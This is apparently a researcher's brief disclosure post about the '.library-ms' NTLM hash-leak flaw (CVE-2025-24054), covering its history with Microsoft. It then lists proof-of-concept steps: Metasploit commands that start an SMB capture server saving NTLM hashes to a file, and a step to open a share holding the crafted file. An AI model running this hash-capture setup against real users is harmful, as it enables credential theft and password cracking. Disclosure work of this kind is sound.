Back in 2018, I reported a ".library-ms" File NTLM information disclosure vulnerability to MSRC and was told "it was not severe enough", that being said I post it anyways.
Seven years passed, until other researchers re-reported it.

Subsequently this security flaw was finally deemed important by Microsoft and it received CVE-2025-24054, for which I was finally retroactively credited as the original reporter.

Circa 2025 updated:

2) Using smb capture from Kali

msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > set JOHNPWFILE /tmp/hashes.txt
JOHNPWFILE = /tmp/hashes.txt
msf auxiliary(smb) > exploit -j
[*] Auxiliary module running as background job

msf auxiliary(smb)


3) Access the Network share containing the "test.library-ms" Windows file type.
